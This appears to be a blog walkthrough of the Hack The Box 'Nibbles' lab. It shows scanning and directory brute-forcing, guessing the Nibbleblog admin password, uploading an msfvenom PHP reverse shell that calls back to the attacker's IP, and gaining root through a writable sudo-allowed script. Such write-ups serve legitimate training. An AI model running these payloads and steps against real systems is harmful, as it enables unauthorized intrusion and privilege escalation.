---
layout: post
title: HTB Nibbles
modified: 2021-06-03
categories: [Hack The Box]
---

<style>
img {
  width: 93%;
  height: 93%;
}
</style>

# HackTheBox | Nibbles

## Initial TCP Nmap Scan

```
Nmap scan report for 10.10.10.75
Host is up (0.080s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/
```

## Full TCP Nmap Scan

~~~
Nmap scan report for 10.10.10.75
Host is up (0.080s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/
~~~

## Initial Thoughts Based On Nmap Scans

Looking at the Nmap scan, it is starting to become a little too typical for HackTheBoxes to just have HTTP and SSH open. With that being said, I am going to first enumerate HTTP since SSH is not a port to be starting off at due to SSH needing some sort of credentials and at the least a username if we were going to attempt to brute-force the account. When I begin my enumeration on HTTP, I typically like to visit the website quickly just to see what the website looks like and start to interact with it like a normal user would to get an understanding of common and uncommon functionality. Before I begin going too deep into manually enumerating the site, I will go ahead and run some type of directory brute force attack to discover directories by using tools such as `gobuster` or `ffuf`. While these scans are going, looking for low hanging fruit such as finding exposed service versions whether it is in a footer of the website or even commented out in the page's source code is a great place to start looking for vulnerabilities. Looking for default credentials for a service such as `admin:admin` or weak passwords like `admin:password` is also a good idea. I will also be on the look out for any parameters I can stick payloads into. Typically I would be looking into local file inclusion, SQL injection, cross-site scripting, etc. With my initial enumeration plan being set, let's jump into enumerating HTTP.

## 80 - HTTP | Enumeration

Navigating to `10.10.10.75` shows the following web page:

<p align="center">
  <img src="{{ site.github.url }}/images/htb/nibbles/image-20210710154011484.png" />
</p>

I just get a page that says "Hello World!". This isn't very helpful. I thought this was a little suspicious though so I went ahead and right-clicked the page and and hit "View Page Source". This let's me view the source code of the page I was on. Looking at the page's source code I found something pretty interesting:

<p align="center">
  <img src="{{ site.github.url }}/images/htb/nibbles/image-20210710154117108.png" />
</p>


It brings up a directory `/nibbleblog/`. I go ahead and enter that into my browser and go to `10.10.10.75/nibbleblog/`. 

<p align="center">
  <img src="{{ site.github.url }}/images/htb/nibbles/image-20210710154153222.png" />
</p>


This directory seems pretty interesting. I am going to go ahead and run a directory-brute force against the URL `10.10.10.75/nibbleblog/`. I am also going to use some extensions with my directory brute force attack so it searches for file extensions. This can be really helpful if you now what websites are built with such as PHP, HTML, JS, etc. There is actually a really helpful plugin called [Wappalyzer](https://www.wappalyzer.com/) which will do its best to find out the technology stack of the website you are on. Looking at Wappalyzer it shows this for `10.10.10.75/nibbleblog/`:

<p align="center">
  <img src="{{ site.github.url }}/images/htb/nibbles/image-20210710154218651.png" />
</p>

Note that these aren't always 100% correct but it's a great tool that can definitely help out most of the time. So we see that the programming language is `.php` so we can add that file extension into our list of extensions to check for. You could always just blindly  add a lot of file extensions just as a sanity check if you have absolutely no idea what programming language a website is being ran under, but it'll definitely make the scan take a lot longer. The `ffuf` command I use is the following:

```
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.75/nibbleblog/FUZZ -e .php,.txt,.pdf,.html
```

Looking at the flags, `-w` is the path of the wordlist we are going to use, `-u` specifies a target URL which is `http://10.10.10.75/nibbleblog/` and the FUZZ word at the end tells ffuf where to fuzz with the wordlist so it will start throwing all of the words in the `directory-list-2.3.-medium.txt` wordlist where FUZZ is. Lastly, `-e` is the flag used for extensions. I am using `.php`,`.txt`,`.pdf`, and `.html`. I used `.txt`,`.pdf`, and `.html` because these are pretty universal and can be found in a lot of websites so no harm in looking for those too. Something I instantly notice when I run this scan is I find an `admin.php` page. 

<p align="center">
  <img src="{{ site.github.url }}/images/htb/nibbles/image-20210710161731802.png" />
</p>

Looks like a login page to sign into the admin area of Nibbleblog. Looking up Nibbleblog on Google, it is just a free content management system ("CMS"). I went ahead and tried to look up any exploits before I try attempting any weak passwords / default credentials and found two on searchsploit, which is just a tool to search through archives of exploit database which contains a vast amount of exploits. I see there is some arbitrary file upload and multiple SQL injections. I'm going to leave those in the back of my mind for now and just try to keep things simple by entering in some easy to guess passwords.

~~~
root@kali-[~]searchsploit nibbleblog                   
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                     |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nibbleblog 3 - Multiple SQL Injections                                                                                                                             | php/webapps/35865.txt
Nibbleblog 4.0.3 - Arbitrary File Upload (Metasploit)                                                                                                              | php/remote/38489.rb
------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
~~~

I start entering in a handful of default credentials like `admin:admin`, `admin:password`, etc. Eventually my IP gets blocked which sucks. I go ahead and reset the box and tried something more simple like `admin:nibbles` and got in. I'm not the biggest fan of entering in default credentials  like that, especially if there is no prior documentation stating these are default credentials but at least it was something I could guess.

<p align="center">
  <img src="{{ site.github.url }}/images/htb/nibbles/image-20210710154302458.png" />
</p>


## Initial Foothold

Looking online, I found a possible way to gain a shell since I am authenticated from [WikiHak](https://wikihak.com/how-to-upload-a-shell-in-nibbleblog-4-0-3/). It mentions to enable the "My Image" plugin by going to this link: http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=list

<p align="center">
  <img src="{{ site.github.url }}/images/htb/nibbles/image-20210710160945017.png" />
</p>

We can see the "My Image" plugin is installed. I clicked "Configure" and was brought to this page:

<p align="center">
  <img src="{{ site.github.url }}/images/htb/nibbles/image-20210710161027597.png" />
</p>

All I have to do is click "Browse..." and upload a `.php reverse shell`. You could do this multiple ways but I'm going to just keep it simple and just create one by using MSFvenom which is a payload generator and encoder tool. I'm going to use the following command to create a `php reverse shell payload`. You could also go and use something like [PentestMonkey's PHP reverse shell]([GitHub - pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)) which is great too. I will probably use that one but I will give the command to create a php reverse shell payload with MSFvenom either way:

```
msfvenom -p php/reverse_php LHOST=10.10.14.36 LPORT=1234 -f raw > shell.php
```

This should create a `php reverse shell payload` within the directory you ran this command. I went ahead and uploaded the `shell.php` file.

<p align="center">
  <img src="{{ site.github.url }}/images/htb/nibbles/image-20210710161447380.png" />
</p>

Hitting "Save changes" I got thrown a few errors on my page. 

<p align="center">
  <img src="{{ site.github.url }}/images/htb/nibbles/image-20210710161512761.png" />
</p>

After uploading the `shell.php` file, we can navigate to the following directory:

```
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/
```

<p align="center">
  <img src="{{ site.github.url }}/images/htb/nibbles/image-20210710161600961.png" />
</p>

Here we are going to see an `image.php` file. This is the reverse shell payload. Before I click on the `image.php` file to execute my reverse shell payload, I setup a Netcat listener on port 443 since that is what I created the payload to connect to.

```
nc -lvnp 1234
```

I open up the `image.php` file and...

```
root@kali-[~]nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.36] from (UNKNOWN) [10.10.10.75] 56028
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64
GNU/Linux
 23:13:08 up  6:28,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
```

I'm going to upgrade my shell to a more interactive shell. To do this, we enter in the following command:

````
python3 -c 'import pty; pty.spawn("/bin/bash")'
````

After this, press `Ctrl-Z` and it will suspend your shell. After you do this, you will want to type `stty raw echo; fg` and hit enter. Right after you hit enter type `reset` and hit enter. Your terminal should have cleared and put you back in your shell. If you are prompted with which terminal you are using (if you are using tmux it might prompt this) you can type `screen` if you are using `tmux`. Now that my shell is upgrade, the first thing I did was type `sudo -l` to see if I can run anything as sudo with this user so I can escalate my privileges some how.

## Privilege Escalation

```
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sb
in\:/bin\:/snap/bin
User nibbler may run the following commands on Nibbles:│
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

It says I can run the `monitor.sh` file under the absolute path `/home/nibbler/personal/stuff`. Thing is this directory doesn't exist. So we can just go and create it. 

```
mkdir -p /home/nibbler/personal/stuff/
```

Now we can create the file by just typing 

~~~
touch /home/nibbler/personal/stuff/monitor.sh
~~~

Since we can run this file as `sudo`, we can just put a command in that will give us a shell. Can be as simple as spawning a bash shell. I echoed the following into the `monitor.sh` file:

```
echo $'#!/bin/sh\nbash' > /home/nibbler/personal/stuff/monitor.sh
```

Looking at the contents of `monitor.sh` now shows this:

```
nibbler@Nibbles:~ cat /home/nibbler/personal/stuff/monitor.sh
#!/bin/sh
bash
```

Now all we need to do is make it executable by using `chmod +x` on it and run it as sudo.

```
chmod +x /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/./monitor.sh
```

```
root@Nibbles:~# whoami
root
```

And we are now root!
